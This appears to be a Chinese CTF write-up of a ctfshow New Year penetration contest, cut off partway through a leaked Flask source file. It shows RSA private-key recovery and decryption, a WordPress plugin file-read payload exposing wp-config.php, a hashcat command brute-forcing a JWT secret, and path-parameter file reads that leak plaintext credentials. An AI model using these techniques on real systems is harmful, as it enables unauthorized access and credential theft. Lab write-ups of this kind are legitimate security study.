+++
title = "ctfshow元旦渗透赛"
slug = "ctfshow-new-year-penetration-test"
description = "太有意思了"
date = "2025-03-19T13:58:30"
lastmod = "2025-03-19T13:58:30"
image = ""
license = ""
categories = ["ctfshow"]
tags = ["内网渗透"]
+++

来学习一下

## 启程(比赛群:1014981710)

```
ctfshow{654321}
```

不会做，听他们说的(爆破就可以了，Misc手干的)

## 破解加密通讯

上一题里面有一张图片，我们放在010里面来做

![1](QQ20250319-140613.jpg)

![1](QQ20250319-140640.jpg)

```python
if __name__ == '__main__':
    try:
        import secretMessageResponse
    except ImportError:
        import pip
        pip.main(['install', 'secretMessageResponse'])
        from secretMessageResponse import printMessage
```

运行之后得到三个东西

```
请使用组织分配的私钥解密后使用
----------------------------------------------------------
2024-12-16
gHgAsclUVPhWDv4S8Oa8SuRTDaj+V0dI4z2jrQwfvfSFWilWwMKwNULUI48UBLS2shZcm/yv2/e5Hq5VRDfXkdxCYQMdvdnvONtpm2yNiIaLpDV4Rs8fOXJ6kcaeT+mg4RkIIFgx35w4J1KgO72pSP8j1p+R9f9TNMafwJ91XmO4QTcOYkMKQMddKvhbyMXzJkSS0uZqEppNSIUnVX9b7m8PmMjV0uHShvb1Zc8UQWJWUJ3cOxwNasOeMQGxJrZXPkxIxDYzm3f0tXbCgvdgNZ8TQY7u+iCXjOtD6xnUsdSahnPq14BD30CilIfsG0r/klPHfxQ+psmHSX47Ylai0TtgfbHWJJ4lSo0ojMvTx6HYK8zmAoCmg4OGXDbv/IjJgYU1w24na0iXZCNtcjB9MLRNck00c20f/uS64Ss0Ixii8nmfsFOjQBCcIYN+HGmOnj5Uw8DVJrxlOmcfQciG3rzuIvYlbOdGMcyarTy2Ba7iZfoovYZObPscAwhNLWqbU4tuR78aOVxiXTFRY7+Y0x2eRT5sulcvB3vsKuDMlNrxaUgiFUohPBZGNsgQgyCPxxqk0NpUn0bbHLH+vBebjJxaim4AU28ctWW8xv7xpxVttb0EoohtK2cIHr79ep5XrU/rv4R58obD/o+QqI1Mrb4wwpX9tsL7ZbROw/MXJwM=
----------------------------------------------------------


请使用组织分配的私钥解密后使用
----------------------------------------------------------
2024-04-11
Z93Khatj+AWZcpPwIqu8LzbJ8xb8CuVMI8okE0qwoQD2IC2lixg77mJZireOrbW7zFkDsk1hP67dROJZwVUDrYot2g5GxX/xy7lGjIblUX4iJVUtP4mHqZUgKROaLoh/gippMpP+8Ik2X/QRBx5gdhq0xam+wuVC+77/tyu8Fd/DohKbAMp8aaJsFr/W4mLDZ1gv4JK+2O3l+bAvpodBRTzb0ld5zD2ueYvjTudoDjdanQP1oVTH7pkDO2Vb+SsdIyTi2C410JEOF4Qm8mzVHtiOunOcLVpAlQsM6/LdhqsTNelXl/Myb84NGxwGWVmx6j2QejiL7S1hHeHlmQ9ExHeURPdZAvKhgMCemYXu3BGlFq3ydb5SkqwLFvM4vJ6XUBcWkHT8eijBFF6Y7YgOv9GRvBTnsAQhUBp4W4EAMtXkDdToG+S8ZO7El8Gh8jaWC49n5CuUBRz3z2GeOVbsBamfLV06IO5v78jGHXig4saEFKHvYSIGewyUCVQEGoIR5xOTJBTUTePAdvQjfg28vZZxFB/hIYNDUHkaek1Mg1UH5HWGgsCX1In5hSX/9eBkznEhzeWnJ1yMsYkj+ddN34DLQSrHc83geXMcoW3Ah3cAQG8E8bszvKL3hme+T5rOeENjkOAgYhf84k4YlxDskdwvzyu8HkE9CSaBpDP6lKI=
----------------------------------------------------------


请使用组织分配的私钥解密后使用
----------------------------------------------------------
2024-03-05
ckDSthpl5DDJMpBE26Jqk8EjaSq7MUntdwLHPouwx6D38un6WQfLJ9wgDyjh9GA/ICJR7WrwWsVinr6y3u9w+ubMZ0mqmtnphzQraagk8NkKc1u1+qGp8llsud3C8mvJWa4GYa9KEhnACDHwppPKJDCfr1HKwPbR0NIi+1Aunmy6DeOKRkFwysnrSco5QiiC9+gdXFhQDmN9KEiYW6Pc3mWVbqFiJgRW3/Df6638oGPm6AUcgRnEWMKiluyN81frM9VNtCeJ64YrU6Rgx4D153YxNNQbLTcyCQMamHTrJnhxPojkuDqbEcU+iiN4offwrQyr4eEu9ecvmyD2w/n7pAOsVnqSzroBujVA+CK6Zq8Uie15mL5yWG9hD5ZcbSwnRmtqK3yl0Xl91hgn1JqcIEKtf+MnMQPr80uoxT3mz8IX8pyVnyyw1x6F+IK1I2G+5w6rUDjhzIbME5XB9hopwcswsXrMo9PP6/5Sz1noJrsu6k6WN8ZM0MyRIav+xuKP1+cYzlPSQZrMo3L4ieHQnBbsoyzGVf9QONMwaooGOrxu88ZWlGe8e7eyCzteeNSVOC2zqtQiwQJIgfp2UwTymA/cEjOICWVzUXwbE5wWUBPCLp2C/XWc82byrOHAFXHLOVKgolVToUpZ5uOvizgk/ahaxdGxGa9CrRyr6sf+goA=
----------------------------------------------------------
```

上一题的描述中还可以得到`https://ctfer-1257200238.cos.ap-shanghai.myqcloud.com/2025/01/hint.txt`

```
633246888504573920779824237508007735589231666589188021171575950939940255140086052090801972411182075806200277922264916256376952068104942084262732765302869757002336862151158422906662985191392193462511289187123754337854684702016396996198789908170728175626225281406256476216079863574750768787169969475152717430903460149705597463505143799487488630064694962535355825378265518133414832135165998125004282912865895836379205933895029154287788824317000843771251331435939410389957572552746410933103347212260533351406876584798128116835102705770834548333327952204414218313396767348386545933700371706780732081128764732828398879654027694999061445888984652196057717761623666471390226500419047354546009526849190038055817008252022472857695300387827500818231719929626707573775972451255428059119840669826086027702546510213791864358183204530776020004866770536545695330324167569777791175170044812028227494966458864002660598592490354017639158027968836329598282419666463285900175674408026881052737148611395153194390130628356104784358804158581294733196703476913434055209441802708485723455322985654447400945734717510509951259155462497189459983874690099575241597111904193711108488616566486665053884629084564364205319797812148684173057523812840684555544241901417
31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681
19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657
```

密码人应该知道这就是n,p,q，但是我就是一根，所以直接复现，先恢复私钥

```python
from Crypto.PublicKey import RSA

p=31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681
q=19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657
e=65537
n=633246888504573920779824237508007735589231666589188021171575950939940255140086052090801972411182075806200277922264916256376952068104942084262732765302869757002336862151158422906662985191392193462511289187123754337854684702016396996198789908170728175626225281406256476216079863574750768787169969475152717430903460149705597463505143799487488630064694962535355825378265518133414832135165998125004282912865895836379205933895029154287788824317000843771251331435939410389957572552746410933103347212260533351406876584798128116835102705770834548333327952204414218313396767348386545933700371706780732081128764732828398879654027694999061445888984652196057717761623666471390226500419047354546009526849190038055817008252022472857695300387827500818231719929626707573775972451255428059119840669826086027702546510213791864358183204530776020004866770536545695330324167569777791175170044812028227494966458864002660598592490354017639158027968836329598282419666463285900175674408026881052737148611395153194390130628356104784358804158581294733196703476913434055209441802708485723455322985654447400945734717510509951259155462497189459983874690099575241597111904193711108488616566486665053884629084564364205319797812148684173057523812840684555544241901417
phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
key = RSA.construct((n, e, d, p, q))
private_key = key.export_key()
print(private_key.decode('utf-8'))
```

得到了私钥，但是如何解密我们要跟进到这个类去看`pip show secretMessageResponse`，得到他的代码

```python
import base64,datetime


message = {
    "inputMessage_20241216" :'''gHgAsclUVPhWDv4S8Oa8SuRTDaj+V0dI4z2jrQwfvfSFWilWwMKwNULUI48UBLS2shZcm/yv2/e5Hq5VRDfXkdxCYQMdvdnvONtpm2yNiIaLpDV4Rs8fOXJ6kcaeT+mg4RkIIFgx35w4J1KgO72pSP8j1p+R9f9TNMafwJ91XmO4QTcOYkMKQMddKvhbyMXzJkSS0uZqEppNSIUnVX9b7m8PmMjV0uHShvb1Zc8UQWJWUJ3cOxwNasOeMQGxJrZXPkxIxDYzm3f0tXbCgvdgNZ8TQY7u+iCXjOtD6xnUsdSahnPq14BD30CilIfsG0r/klPHfxQ+psmHSX47Ylai0TtgfbHWJJ4lSo0ojMvTx6HYK8zmAoCmg4OGXDbv/IjJgYU1w24na0iXZCNtcjB9MLRNck00c20f/uS64Ss0Ixii8nmfsFOjQBCcIYN+HGmOnj5Uw8DVJrxlOmcfQciG3rzuIvYlbOdGMcyarTy2Ba7iZfoovYZObPscAwhNLWqbU4tuR78aOVxiXTFRY7+Y0x2eRT5sulcvB3vsKuDMlNrxaUgiFUohPBZGNsgQgyCPxxqk0NpUn0bbHLH+vBebjJxaim4AU28ctWW8xv7xpxVttb0EoohtK2cIHr79ep5XrU/rv4R58obD/o+QqI1Mrb4wwpX9tsL7ZbROw/MXJwM=''',
    "inputMessage_20240411" : '''Z93Khatj+AWZcpPwIqu8LzbJ8xb8CuVMI8okE0qwoQD2IC2lixg77mJZireOrbW7zFkDsk1hP67dROJZwVUDrYot2g5GxX/xy7lGjIblUX4iJVUtP4mHqZUgKROaLoh/gippMpP+8Ik2X/QRBx5gdhq0xam+wuVC+77/tyu8Fd/DohKbAMp8aaJsFr/W4mLDZ1gv4JK+2O3l+bAvpodBRTzb0ld5zD2ueYvjTudoDjdanQP1oVTH7pkDO2Vb+SsdIyTi2C410JEOF4Qm8mzVHtiOunOcLVpAlQsM6/LdhqsTNelXl/Myb84NGxwGWVmx6j2QejiL7S1hHeHlmQ9ExHeURPdZAvKhgMCemYXu3BGlFq3ydb5SkqwLFvM4vJ6XUBcWkHT8eijBFF6Y7YgOv9GRvBTnsAQhUBp4W4EAMtXkDdToG+S8ZO7El8Gh8jaWC49n5CuUBRz3z2GeOVbsBamfLV06IO5v78jGHXig4saEFKHvYSIGewyUCVQEGoIR5xOTJBTUTePAdvQjfg28vZZxFB/hIYNDUHkaek1Mg1UH5HWGgsCX1In5hSX/9eBkznEhzeWnJ1yMsYkj+ddN34DLQSrHc83geXMcoW3Ah3cAQG8E8bszvKL3hme+T5rOeENjkOAgYhf84k4YlxDskdwvzyu8HkE9CSaBpDP6lKI=''',
    "inputMessage_20240305" : '''ckDSthpl5DDJMpBE26Jqk8EjaSq7MUntdwLHPouwx6D38un6WQfLJ9wgDyjh9GA/ICJR7WrwWsVinr6y3u9w+ubMZ0mqmtnphzQraagk8NkKc1u1+qGp8llsud3C8mvJWa4GYa9KEhnACDHwppPKJDCfr1HKwPbR0NIi+1Aunmy6DeOKRkFwysnrSco5QiiC9+gdXFhQDmN9KEiYW6Pc3mWVbqFiJgRW3/Df6638oGPm6AUcgRnEWMKiluyN81frM9VNtCeJ64YrU6Rgx4D153YxNNQbLTcyCQMamHTrJnhxPojkuDqbEcU+iiN4offwrQyr4eEu9ecvmyD2w/n7pAOsVnqSzroBujVA+CK6Zq8Uie15mL5yWG9hD5ZcbSwnRmtqK3yl0Xl91hgn1JqcIEKtf+MnMQPr80uoxT3mz8IX8pyVnyyw1x6F+IK1I2G+5w6rUDjhzIbME5XB9hopwcswsXrMo9PP6/5Sz1noJrsu6k6WN8ZM0MyRIav+xuKP1+cYzlPSQZrMo3L4ieHQnBbsoyzGVf9QONMwaooGOrxu88ZWlGe8e7eyCzteeNSVOC2zqtQiwQJIgfp2UwTymA/cEjOICWVzUXwbE5wWUBPCLp2C/XWc82byrOHAFXHLOVKgolVToUpZ5uOvizgk/ahaxdGxGa9CrRyr6sf+goA=''',

}



def printMessage():
    for key, value in message.items():
        title = key.replace('inputMessage_', '')
        print("\033[1;31m" + "请使用组织分配的私钥解密后使用" + "\033[0m")
        title = datetime.datetime.strptime(title, '%Y%m%d').strftime('%Y-%m-%d')
        print("----------------------------------------------------------")
        print(title)
        print(value)
        print("----------------------------------------------------------")
        print("\n")


# 最新流通公钥
def getPublicKey():
    return b'''
    -----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAmziayo9Tddo1FYdrtOsw
yjLYJ5frYKEwm4rQTsKU8UcdnnDRgms+ZmStoqlH/qi6x+D1K3fvvioCnGZLFHZw
BUqbgT5x+qUmUaVMll9FOT7ZJ05w8n8Ljqa1akzFMU5G7YbCr3vQwN63vwvD9/63
TDbXkJrv1fGl2rHpPwp5OPCUeCB3nIFIRCWHpJU7sHJqIP5vzV8KNJtbxgR+dhsz
dg+NhoBDUpxoVN5lzSKr2TMOLFLZaQR9AWOV/aHV8gjTkTLDZfc+XlfhxiDMTQdi
UTbk/tynpt+JFrDA8vL5/TOmuxgumqgXZIPGrIUbwloTYyHD/XXmvXu5KE8g3eMK
gxNxuEKM5bMTESBK9A7Q2Kj3eNp0Rvb5Aleg7h8/YbQemGelY/o5xpUyHgHjsfNQ
3j/xhdhVCNVaXZF64V/YVpvC9Cq29F7qI+bl6FlN7zSpuHB3QgNS1uXOmjBCsA7y
pZoWmdXeaLIO+I3kP48BBSmue4nidJifiK/kSOcZ0iegRXV1hyZ6pYdDE7hM5V5t
5tvayJ31zRQNT2ALAFeCDozVWELHTnphkPkQO+SOPglrVz0S1dXicqRofXWMj7PJ
OFkBpWIX0aywMIh1woEAawUs3RM2pfLUNtqUTfodSCmWlwcpGrBWG5NACx7csPFt
zWn8oPZfzL346at5DDIwD2kCAwEAAQ==
-----END PUBLIC KEY-----
'''

def enctryptMessage(message):
    import base64
    message_bytes = message.encode('utf-8')  
    message_base64 = base64.b64encode(message_bytes).decode('utf-8')
    publicKey = getPublicKey()
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import padding
    from cryptography.hazmat.primitives import hashes
    public_key = serialization.load_pem_public_key(publicKey, backend=default_backend())
    encrypted = public_key.encrypt(
        message_base64.encode('utf-8'),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    encrypted_base64 = base64.b64encode(encrypted).decode('utf-8')
    return encrypted_base64


printMessage()
```

然后问AI如何解密得到以下脚本

```python
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes

message = {
    "inputMessage_20241216" :'''gHgAsclUVPhWDv4S8Oa8SuRTDaj+V0dI4z2jrQwfvfSFWilWwMKwNULUI48UBLS2shZcm/yv2/e5Hq5VRDfXkdxCYQMdvdnvONtpm2yNiIaLpDV4Rs8fOXJ6kcaeT+mg4RkIIFgx35w4J1KgO72pSP8j1p+R9f9TNMafwJ91XmO4QTcOYkMKQMddKvhbyMXzJkSS0uZqEppNSIUnVX9b7m8PmMjV0uHShvb1Zc8UQWJWUJ3cOxwNasOeMQGxJrZXPkxIxDYzm3f0tXbCgvdgNZ8TQY7u+iCXjOtD6xnUsdSahnPq14BD30CilIfsG0r/klPHfxQ+psmHSX47Ylai0TtgfbHWJJ4lSo0ojMvTx6HYK8zmAoCmg4OGXDbv/IjJgYU1w24na0iXZCNtcjB9MLRNck00c20f/uS64Ss0Ixii8nmfsFOjQBCcIYN+HGmOnj5Uw8DVJrxlOmcfQciG3rzuIvYlbOdGMcyarTy2Ba7iZfoovYZObPscAwhNLWqbU4tuR78aOVxiXTFRY7+Y0x2eRT5sulcvB3vsKuDMlNrxaUgiFUohPBZGNsgQgyCPxxqk0NpUn0bbHLH+vBebjJxaim4AU28ctWW8xv7xpxVttb0EoohtK2cIHr79ep5XrU/rv4R58obD/o+QqI1Mrb4wwpX9tsL7ZbROw/MXJwM=''',
    "inputMessage_20240411" : '''Z93Khatj+AWZcpPwIqu8LzbJ8xb8CuVMI8okE0qwoQD2IC2lixg77mJZireOrbW7zFkDsk1hP67dROJZwVUDrYot2g5GxX/xy7lGjIblUX4iJVUtP4mHqZUgKROaLoh/gippMpP+8Ik2X/QRBx5gdhq0xam+wuVC+77/tyu8Fd/DohKbAMp8aaJsFr/W4mLDZ1gv4JK+2O3l+bAvpodBRTzb0ld5zD2ueYvjTudoDjdanQP1oVTH7pkDO2Vb+SsdIyTi2C410JEOF4Qm8mzVHtiOunOcLVpAlQsM6/LdhqsTNelXl/Myb84NGxwGWVmx6j2QejiL7S1hHeHlmQ9ExHeURPdZAvKhgMCemYXu3BGlFq3ydb5SkqwLFvM4vJ6XUBcWkHT8eijBFF6Y7YgOv9GRvBTnsAQhUBp4W4EAMtXkDdToG+S8ZO7El8Gh8jaWC49n5CuUBRz3z2GeOVbsBamfLV06IO5v78jGHXig4saEFKHvYSIGewyUCVQEGoIR5xOTJBTUTePAdvQjfg28vZZxFB/hIYNDUHkaek1Mg1UH5HWGgsCX1In5hSX/9eBkznEhzeWnJ1yMsYkj+ddN34DLQSrHc83geXMcoW3Ah3cAQG8E8bszvKL3hme+T5rOeENjkOAgYhf84k4YlxDskdwvzyu8HkE9CSaBpDP6lKI=''',
    "inputMessage_20240305" : '''ckDSthpl5DDJMpBE26Jqk8EjaSq7MUntdwLHPouwx6D38un6WQfLJ9wgDyjh9GA/ICJR7WrwWsVinr6y3u9w+ubMZ0mqmtnphzQraagk8NkKc1u1+qGp8llsud3C8mvJWa4GYa9KEhnACDHwppPKJDCfr1HKwPbR0NIi+1Aunmy6DeOKRkFwysnrSco5QiiC9+gdXFhQDmN9KEiYW6Pc3mWVbqFiJgRW3/Df6638oGPm6AUcgRnEWMKiluyN81frM9VNtCeJ64YrU6Rgx4D153YxNNQbLTcyCQMamHTrJnhxPojkuDqbEcU+iiN4offwrQyr4eEu9ecvmyD2w/n7pAOsVnqSzroBujVA+CK6Zq8Uie15mL5yWG9hD5ZcbSwnRmtqK3yl0Xl91hgn1JqcIEKtf+MnMQPr80uoxT3mz8IX8pyVnyyw1x6F+IK1I2G+5w6rUDjhzIbME5XB9hopwcswsXrMo9PP6/5Sz1noJrsu6k6WN8ZM0MyRIav+xuKP1+cYzlPSQZrMo3L4ieHQnBbsoyzGVf9QONMwaooGOrxu88ZWlGe8e7eyCzteeNSVOC2zqtQiwQJIgfp2UwTymA/cEjOICWVzUXwbE5wWUBPCLp2C/XWc82byrOHAFXHLOVKgolVToUpZ5uOvizgk/ahaxdGxGa9CrRyr6sf+goA=''',

}

# 您的私钥，以 PEM 格式存储
private_key_pem = b'''
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
'''


def decrypt_message(encrypted_message):
    # 加载私钥
    private_key = serialization.load_pem_private_key(
        private_key_pem,
        password=None,
        backend=default_backend()
    )

    # 解密前需要先进行 base64 解码
    encrypted_message_bytes = base64.b64decode(encrypted_message)

    # 使用私钥解密
    decrypted = private_key.decrypt(
        encrypted_message_bytes,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # 解码为原始消息
    decrypted_message = base64.b64decode(decrypted).decode('utf-8')
    return decrypted_message


# 遍历并解密消息
for key, value in message.items():
    decrypted_message = decrypt_message(value)
    print(f"解密后的消息 ({key}): {decrypted_message}")

```

得到密文消息

```
解密后的消息 (inputMessage_20241216): Park:
你的行动已经暴露，24小时内迅速撤离，销毁所有资料，将现有资料统一上传到【任务中心】
发送人：Dylan
解密后的消息 (inputMessage_20240411): Park:
总部已经为你安排新的身份，请务必在3日内抵台，你的新身份是新竹县动物保护防疫所网络安全顾问，【任务中心】账号密码和你任职单位网站的数据库用户名密码一致，请尽快修改 
发送人：Dylan
解密后的消息 (inputMessage_20240305): Park:
【任务中心】网址已变更为 https://task.ctfer.com ，请注意修改浏览器地址栏中的链接 
发送人：Dylan
```

## 潜入敌营

记得刷新，才会出现这题，上题的结果给了一个地方，搜索了一下之后，什么意思，让我去打？dirsearch扫出来`robots.txt`，

```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```

WP，直接NDAY一个，`?aam-media=wp-config.php`

![1](QQ20250319-145055.jpg)

```
ctfshow{hsinchug_wp1_Q.4Vyj8VCiedX1KYU5g05}
```

## 秘密潜伏

登录一下情报网站，

![1](QQ20250319-151938.jpg)

发现了这个东西`4a4f7d6e8b5???0c7f`，那必须要破解一下才可以，但是要有个参照物啊，抓包什么的，最后F12找到jwt

![1](QQ20250319-152853.jpg)



```
.\hashcat -a 3 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJoc2luY2h1Z193cDEiLCJleHAiOjE3NDI0NTUwNTd9.5yFwzlOe8BY5jO7glglr3Y9p8LxBQj5KGxLF1qM4QiI --custom-charset1=?l?d 4a4f7d6e8b5?1?1?10c7f
```

原来这东西这么好用，我去了，牛

![1](QQ20250319-153209.jpg)

改一下jwt，刷新抓包

![1](QQ20250319-153507.jpg)

访问`/getPhone`

## 收集敌方身份信息

我们把jwt换进去，但是不是很好换，建议还是抓包来换，换了之后就点forward这样子，换完之后发现

![1](QQ20250319-155715.jpg)

抓包挨个看看发现两个路由可以用

```
/listTaskFiles?path=
/readTaskFile?path=&file_name=init_users.json
```

根目录被限制了，但是一样的可以看文件

```json
{
  "success": 0,
  "file_name": "init_users.json",
  "file_content": {
    "hsinchug_wp1": {
      "username": "hsinchug_wp1",
      "password": "Q.4Vyj8VCiedX1KYU5g05"
    },
    "dylan": {
      "username": "dylan",
      "password": "8f7a55c6d9a7d9a7"
    },
    "secret_user": {
      "username": "root",
      "password": "7y.(sc#Ac_"
    }
  }
}
```

拿到用户名密码可以直接root进了，读取到`main.py.bak`

```python
from flask import Flask, request, jsonify, session
from flask import url_for, redirect
import logging
from os.path import basename, join

app = Flask(__name__)
app.config['SECRET_KEY'] = '3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5'  # 硬编码密钥需替换

@app.route('/', methods=['GET'])
def index():
    session['user'] = 'guest'
    return {'message': 'log server is running'}

def check_session():
    if 'user' not in session or session['user'] != 'admin':
        return False
    return True

@app.route('/key', methods=['GET'])
def get_key():
    if not check_session():
        return {"message": "not authorized"}
    with open('/log_server_key.txt', 'r') as f:
        return {'message': 'key', 'key': f.read()}

@app.route('/set_log_option')
def set_log_option():
    if not check_session():
        return {"message": "not authorized"}
    
    log_name = request.args.get('logName')
    log_file = request.args.get('logFile')
    app_log = logging.getLogger(log_name)
    
    log_path = f'./log/{log_file}'
    app_log.addHandler(logging.FileHandler(log_path))
    app_log.setLevel(logging.INFO)
    
    clear_log_file(log_path)
    return {'message': 'log option set successfully'}

@app.route('/get_log_content')
def get_log_content():
    if not check_session():
        return {"message": "not authorized"}
    
